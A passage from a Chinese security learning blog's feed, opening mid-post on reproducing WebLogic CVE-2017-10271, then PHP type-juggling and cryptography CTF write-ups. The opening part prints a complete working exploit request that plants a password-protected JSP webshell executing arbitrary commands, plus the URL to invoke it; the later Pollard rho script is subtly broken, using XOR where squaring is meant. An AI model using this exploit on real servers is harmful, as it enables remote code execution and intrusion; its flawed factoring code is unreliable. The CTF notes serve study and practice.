class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/wls-wsat/CoordinatorPortType</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: your-ip:7001</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,en-US;q=0.7,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Content-Type</span>: text/xml</span><br><span class="line"><span class="attribute">Content-Length</span>: 929</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;</span><br><span class="line">    &lt;soapenv:Header&gt;</span><br><span class="line">    &lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;</span><br><span class="line">    &lt;java&gt;&lt;java version="1.4.0" class="java.beans.XMLDecoder"&gt;</span><br><span class="line">    &lt;object class="java.io.PrintWriter"&gt; </span><br><span class="line">    &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp&lt;/string&gt;&lt;void method="println"&gt;&lt;string&gt;&lt;![CDATA[</span><br><span class="line"></span><br><span class="line"> &lt;%</span><br><span class="line">    if("yakko".equals(request.getParameter("pwd")))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();</span><br><span class="line">        int a = -1;</span><br><span class="line">        byte[] b = new byte[2048];</span><br><span class="line">        out.print("&lt;pre&gt;");</span><br><span class="line">        while((a=in.read(b))!=-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print("&lt;/pre&gt;");</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;]]&gt;&lt;/string&gt;&lt;/void&gt;&lt;void method="close"/&gt;&lt;/object&gt;&lt;/java&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure></div><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6t3vgj312c0ian1t.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6t3vgj312c0ian1t.jpg" class="lazyload"></a></p><h2 id="访问-shell"><a href="#访问-shell" class="headerlink" title="访问 shell"></a>访问 shell</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;your-ip:7001&#x2F;bea_wls_internal&#x2F;test.jsp?pwd&#x3D;yakko&amp;i&#x3D;ls</span><br></pre></td></tr></table></figure></div><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6pqkzj30kp07rmxd.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6pqkzj30kp07rmxd.jpg" class="lazyload"></a></p><hr><h1 id="扯一下"><a href="#扯一下" class="headerlink" title="扯一下"></a>扯一下</h1><p>不知不觉开学了，本来还说要多A几道题，多看些书，结果50来天的寒假就结束了，淦，啥都没看，摸鱼摸着摸着就要毕业了，也曾梦想仗剑走天涯，结果发现自己什么本领都没有，只能望着远方的渐行渐远的身影，迷茫着不知道自己该何去何从。</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6plqrj30g40f5767.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6plqrj30g40f5767.jpg" class="lazyload"></a></p><p>参考链接如下<br><a href="https://www.cnblogs.com/xyongsec/archive/2019/07/03/11125511.html" target="_blank" rel="noopener">Weblogic(CVE-2017-10271)漏洞复现</a><br><a href="https://paper.seebug.org/487/" target="_blank" rel="noopener">Weblogic XMLDecoder RCE分析</a><br><a href="https://blog.51cto.com/duallay/1961598" target="_blank" rel="noopener">XMLDecoder反序列化漏洞</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Weblogic是oracle推出的application server，由于其具有支持EJB、JSP、JMS、XML等多种语言、可扩展性、快速开发等多种特性，备受广大系统管理员的青睐。根据不完全统计weblogic约占全球市场份额1/3，正因为这么高的占有率，也造成每次weblogic有新的漏洞，都会在业内引起轩然大波。在2017年接近尾声时，weblogic又再次给大家带来了巨大惊喜，CVE-2017-10271漏洞又一次席卷了政府、银行等各大行业。&lt;/p&gt;
    
    </summary>
    
    
      <category term="学习笔记" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="渗透" scheme="https://manayakko.github.io/yakko117/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>从一道题学习php的小特性</title>
    <link href="https://manayakko.github.io/yakko117/2020/02/12/php%E5%B0%8F%E7%89%B9%E6%80%A7/"/>
    <id>https://manayakko.github.io/yakko117/2020/02/12/php%E5%B0%8F%E7%89%B9%E6%80%A7/</id>
    <published>2020-02-12T12:23:08.085Z</published>
    <updated>2020-02-12T13:26:30.124Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>P神，永远滴神~ (抖个机灵）<br>手上还攒着几个问题，一直没怎么花时间去学习，要抓紧时间了</p><a id="more"></a><h1 id="安恒-奇怪的恐龙特性"><a href="#安恒-奇怪的恐龙特性" class="headerlink" title="[安恒] 奇怪的恐龙特性"></a>[安恒] 奇怪的恐龙特性</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">ini_set(<span class="string">"display_error"</span>, <span class="keyword">false</span>);  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line">$str = <span class="keyword">isset</span>($_GET[<span class="string">'A_A'</span>])?$_GET[<span class="string">'A_A'</span>]:<span class="string">'A_A'</span>; </span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">"A_A"</span>) !==<span class="keyword">false</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,have fun'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> ($str&lt;<span class="number">9999999999</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too small'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> ((string)$str&gt;<span class="number">0</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too big'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'flag.php'</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><h1 id="首先先看一下p神的说法"><a href="#首先先看一下p神的说法" class="headerlink" title="首先先看一下p神的说法"></a>首先先看一下p神的说法</h1><pre><code>我一直在思考，假设我有一个办法，在第一次WAF检测参数的时候，检测的是22222，但后面覆盖request的时候，拿到的是11111，那么不就可以造成WAF的绕过了么？但上述两个实验的结果表示，我这个假设是不成立的。二者获取的结果都是22222 。那么，这个思路是否就是不可行的了？</code></pre><p><code>php</code> 自身在解析请求的时候，如果参数名字中包含 <code>&quot; &quot;</code>、<code>&quot;.&quot;</code>、<code>&quot;[&quot;</code> 这几个字符，会将他们转换成 <code>_</code> 。<br>那么假设我发送的是这样一个请求： <code>/t.php?user_id=11111&amp;user.id=22222</code> <code>php</code> 先将 <code>user.id</code> 转换成 <code>user_id</code> 即为 <code>/t.php?user_id=11111&amp;user_id=22222</code> 再获取到的<code>$_REQUEST[&#39;user_id&#39;]</code>就是22222。<br>可在 <code>$_SERVER[&#39;REQUEST_URI&#39;]</code> 中 <code>user_id</code> 和<code>user.id</code>却是两个完全不同的参数名，切割覆盖后，获取的 <code>$_REQUEST[&#39;user_id&#39;]</code> 却是 <code>11111</code>。</p><p>然后再看题目</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> ($str&lt;<span class="number">9999999999</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too small'</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>利用数字绕过：数组永远比数字大，永远比数字大</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# php -r "@var_dump(admin==0);"</span><br><span class="line">bool(true)</span><br><span class="line">root@kali:~# php -r "var_dump([]&gt;999999999999999999999);"</span><br><span class="line">bool(true)</span><br></pre></td></tr></table></figure></div><p>第二个判断是强制转化为字符串再与数字比较的判断</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> ((string)$str&gt;<span class="number">0</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too big'</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>简单的弱类型绕过了，让参数等于某个字符串，例如：<code>admin</code> 就可以了，因为<code>admin== 0</code>，结果是<code>true</code>，直接等于0绕过，最后的Payload:</p><p><code>?A+A[]=admin</code>w</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;P神，永远滴神~ (抖个机灵）&lt;br&gt;手上还攒着几个问题，一直没怎么花时间去学习，要抓紧时间了&lt;/p&gt;
    
    </summary>
    
    
      <category term="学习笔记" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="php" scheme="https://manayakko.github.io/yakko117/tags/php/"/>
    
      <category term="ctf" scheme="https://manayakko.github.io/yakko117/tags/ctf/"/>
    
      <category term="code audit" scheme="https://manayakko.github.io/yakko117/tags/code-audit/"/>
    
  </entry>
  
  <entry>
    <title>CTF密码学入门学习(一)</title>
    <link href="https://manayakko.github.io/yakko117/2020/02/11/ctf%E5%AF%86%E7%A0%81%E5%AD%A61/"/>
    <id>https://manayakko.github.io/yakko117/2020/02/11/ctf%E5%AF%86%E7%A0%81%E5%AD%A61/</id>
    <published>2020-02-11T04:18:47.544Z</published>
    <updated>2020-02-11T13:15:58.195Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="变异凯撒"><a href="#变异凯撒" class="headerlink" title="变异凯撒"></a>变异凯撒</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">加密密文：afZ_r9VYfScOeO_UL^RWUc</span><br><span class="line">格式：flag&#123; &#125;</span><br></pre></td></tr></table></figure></div><p>既然说是凯撒密码，先尝试常规解码，但发现没有一个正常的解码<br>因此考虑读Ascii码</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91ihu2j30r00hlk3r.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91ihu2j30r00hlk3r.jpg" class="lazyload"></a></p><p>题目已经提示密文格式为: <code>flag{</code><br>我们对照相应的Ascii码</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">f-&gt;</span><span class="bash">102；l-&gt;108；a-&gt;97；g-&gt;103；&#123;-&gt;123</span></span><br><span class="line"></span><br><span class="line"><span class="meta">a-&gt;</span><span class="bash">97；f-&gt;102；Z-&gt;90；_-&gt;95；r-&gt;114</span></span><br></pre></td></tr></table></figure></div><p>可以看到第一个相差5，第二个相差6，以此类推</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91gg66j307806ot8m.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91gg66j307806ot8m.jpg" class="lazyload"></a></p><p>最后构造如下脚本：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[] = <span class="string">"afZ_r9VYfScOeO_UL^RWUc"</span>;</span><br><span class="line"><span class="keyword">int</span> CS = <span class="built_in">strlen</span>(a), t; <span class="comment">// 计算字符串长度 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; CS; i++)</span><br><span class="line">&#123;</span><br><span class="line">t = a[i];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, t + i+<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><hr><p>然后后来也看到有师傅有其他脚本</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b_kaisa</span><span class="params">(mstr)</span>:</span></span><br><span class="line">    j = <span class="number">5</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    lmstr = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(mstr)):</span><br><span class="line">        m = ord(mstr[i])          <span class="comment"># 将密文的第i个字母变为其ascii码值</span></span><br><span class="line">        m = m + j                 <span class="comment"># ascii值+j</span></span><br><span class="line">        lmstr.append(m)           <span class="comment"># 将递进后的ascii值存入列表lmstr[]</span></span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line">        j = j+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> lmstr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    m_str = <span class="string">'afZ_r9VYfScOeO_UL^RWUc'</span>    <span class="comment"># 密文</span></span><br><span class="line">    lstr = []</span><br><span class="line">    lstr = b_kaisa(m_str)</span><br><span class="line">    <span class="keyword">print</span> lstr</span><br></pre></td></tr></table></figure></div><p>跑出来结果为</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[102, 108, 97, 103, 123, 67, 97, 101, 115, 97, 114, 95, 118, 97, 114, 105, 97, 116, 105, 111, 110, 125]</span><br></pre></td></tr></table></figure></div><p>放到 <code>Ascii解码器</code>，得到的答案一样</p><hr><h1 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h1><p>参考文献如下：<br><a href="https://blog.csdn.net/wclxyn/article/details/7288994" target="_blank" rel="noopener">一个zip文件由这样三个部分组成</a><br><a href="https://blog.csdn.net/qq_26187985/article/details/83654197" target="_blank" rel="noopener">zip伪加密原理及操作</a></p><p>通过winhex 打开文件</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91frovj30me084aam.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91frovj30me084aam.jpg" class="lazyload"></a></p><p>压缩源文件目录区：<br><code>50 4B 01 02</code>：目录中文件文件头标记</p><p><code>00 00</code>：压缩使用的版本<br><code>14 00</code>：解压文件所需 pkware 版本<br><code>00 00</code>：全局方式位标记（有无加密，这个更改这里进行伪加密，改为 <code>09 00</code> 打开就会提示有密码了）</p><p>压缩源文件目录结束标志 ：<code>50 4B 05 06</code></p><p>首先先查找 <code>504B</code>，点击第二个<code>504B</code>（压缩源文件目录区）</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91hcdrj30i006ojrs.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91hcdrj30i006ojrs.jpg" class="lazyload"></a></p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91gseyj30oj0cagmm.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91gseyj30oj0cagmm.jpg" class="lazyload"></a></p><p>修改后就可以得到flag了（上面还有一个 <code>09 00</code> 也要改）</p><hr><h1 id="basic-RSA"><a href="#basic-RSA" class="headerlink" title="basic_RSA"></a>basic_RSA</h1><p><a href="http://buuoj.cn/files/b37f7f440149a3ac517deed5849bc529/70a2f2f0-d422-4cda-a92b-3c48eb9a0fbd.zip" target="_blank" rel="noopener">题目链接</a></p><p>题目内容:</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在一次RSA密钥对生成中，假设p=<span class="number">473398607161</span>，q=<span class="number">4511491</span>，e=<span class="number">17</span></span><br><span class="line">求解出d作为flag提交</span><br></pre></td></tr></table></figure></div><h2 id="RSA-算法"><a href="#RSA-算法" class="headerlink" title="RSA 算法"></a>RSA 算法</h2><h3 id="首先随机找两个质数-P-和-Q-P-与-Q-越大，越安全"><a href="#首先随机找两个质数-P-和-Q-P-与-Q-越大，越安全" class="headerlink" title="首先随机找两个质数 P 和 Q ,P 与 Q 越大，越安全"></a>首先随机找两个质数 <code>P</code> 和 <code>Q</code> ,<code>P</code> 与 <code>Q</code> 越大，越安全</h3><p>公钥 <code>n = P*Q</code>，其中 <code>P</code> 和 <code>Q</code> 是两个大素数</p><h3 id="然后计算-n-的欧拉函数-φ-n-。"><a href="#然后计算-n-的欧拉函数-φ-n-。" class="headerlink" title="然后计算 n 的欧拉函数 φ(n)。"></a>然后计算 <code>n</code> 的欧拉函数 <code>φ(n)</code>。</h3><p><code>φ(n)</code> 表示在小于等于 <code>n</code> 的正整数之中，与 <code>n</code> 构成互质关系的数的个数。<br>例如：在 1 到 8 之中，与 8 形成互质关系的是1、3、5、7，所以 <code>φ(n)=4</code>。</p><p>如果 <code>n = P*Q</code>，<code>P</code> 与 <code>Q</code> 均为质数，则 <code>m = φ(n) = (p-1)*(q-1)</code></p><h3 id="然后随机选择的数-e，作为公钥"><a href="#然后随机选择的数-e，作为公钥" class="headerlink" title="然后随机选择的数 e，作为公钥"></a>然后随机选择的数 <code>e</code>，作为公钥</h3><p>条件是 <code>1 &lt; e &lt; m</code>，且 <code>e</code> 与 <code>m</code> 互质。</p><h3 id="有一个整数-d，可以使得-e-d-除以-m-的余数为-1"><a href="#有一个整数-d，可以使得-e-d-除以-m-的余数为-1" class="headerlink" title="有一个整数 d，可以使得 e*d 除以 m 的余数为 1"></a>有一个整数 d，可以使得 e*d 除以 m 的余数为 1</h3><p><code>d</code> 是跟 <code>e</code> 有关的一个数，满足条件式：<code>e*d=1(mod φ(n))</code></p><h2 id="反推求d"><a href="#反推求d" class="headerlink" title="反推求d"></a>反推求d</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p=<span class="number">473398607161</span></span><br><span class="line">q=<span class="number">4511491</span></span><br><span class="line">e=<span class="number">17</span></span><br><span class="line">d=gmpy2.invert(e,(q<span class="number">-1</span>)*(p<span class="number">-1</span>))</span><br><span class="line"><span class="keyword">print</span> (d)</span><br></pre></td></tr></table></figure></div><p>因为嫌装vc14.0 麻烦，所以直接去导入 <code>gmpy2</code> 的whl包<br><a href="https://www.lfd.uci.edu/~gohlke/pythonlibs" target="_blank" rel="noopener">引用库网站地址</a><br>我用的是 <code>py3.8</code> 32位的包，自己可以去找到合适自己py版本的安装</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install C:\Users\Manayakko\Desktop\gmpy2-2.0.8-cp38-cp38-win32.whl</span><br></pre></td></tr></table></figure></div><hr><h1 id="Alice与Bob"><a href="#Alice与Bob" class="headerlink" title="Alice与Bob"></a>Alice与Bob</h1><p>密码学历史中，有两位知名的杰出人物，Alice和Bob。他们的爱情经过置换和轮加密也难以混淆，即使是没有身份认证也可以知根知底。就像在数学王国中的素数一样，孤傲又热情。下面是一个大整数: <code>98554799767</code> ,请分解为两个素数，分解后，小的放前面，大的放后面，合成一个新的数字，进行md5的32位小写哈希，提交答案。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/The__Apollo/article/details/80279716" target="_blank" rel="noopener">简述大数分解算法Pollard Rho和Pollard p-1</a><br><a href="https://blog.csdn.net/weixin_42251364/article/details/95462358" target="_blank" rel="noopener">因数分解——Pollard’ p-1 &amp; Pollard rho</a></p><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> fractions <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PollardRho</span><span class="params">(n)</span>:</span></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    xi = randint(<span class="number">0</span>,n<span class="number">-1</span>);  </span><br><span class="line">    <span class="comment"># 在范围内随机生成一个数</span></span><br><span class="line">    </span><br><span class="line">    k = <span class="number">2</span></span><br><span class="line">    y = xi</span><br><span class="line">    <span class="keyword">while</span> i &lt; n:</span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line">        xi = ((xi^<span class="number">2</span>)<span class="number">-1</span>) % n</span><br><span class="line">        <span class="comment"># xi 与2 (二进制)异或减1 然后除 n 求余数 </span></span><br><span class="line">        <span class="comment"># 1^1=0   0^0=0    1^0=1</span></span><br><span class="line">        </span><br><span class="line">        d = gcd(y-xi,n)  </span><br><span class="line">        <span class="comment"># 欧几里得算法求最大公约数</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> d != <span class="number">1</span> <span class="keyword">and</span> d !=n:</span><br><span class="line">            print(d)</span><br><span class="line">            <span class="keyword">if</span> i == k:</span><br><span class="line">                y = xi</span><br><span class="line">                k = <span class="number">2</span>*k</span><br><span class="line"></span><br><span class="line">PollardRho(<span class="number">98554799767</span>)</span><br></pre></td></tr></table></figure></div><hr><h1 id="日常瞎扯"><a href="#日常瞎扯" class="headerlink" title="日常瞎扯"></a>日常瞎扯</h1><p>本来还说要多看一点，结果今天感觉自己不在状态。 好好休整，等一下看其他东西算了，呆在家里关久了，其实还是有点烦的，感觉挺影响自己情绪和状态，手头还有些东西没看，主要是每天看数学要花费太多时间了，最近a题也没什么时间，也没时间去看些漏洞，学些姿势，慢慢来吧，虽然不能像前面那样每天花时间去a题，去学技术，但还是抓紧时间学习吧，现在的主要目标是准备考研（考上了起码还能多2年摸鱼膜大佬的时间</p>]]></content>
    
    <summary type="html">
    
      反正想到啥写啥
    
    </summary>
    
    
      <category term="学习笔记" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="writeup" scheme="https://manayakko.github.io/yakko117/tags/writeup/"/>
    
      <category term="ctf" scheme="https://manayakko.github.io/yakko117/tags/ctf/"/>
    
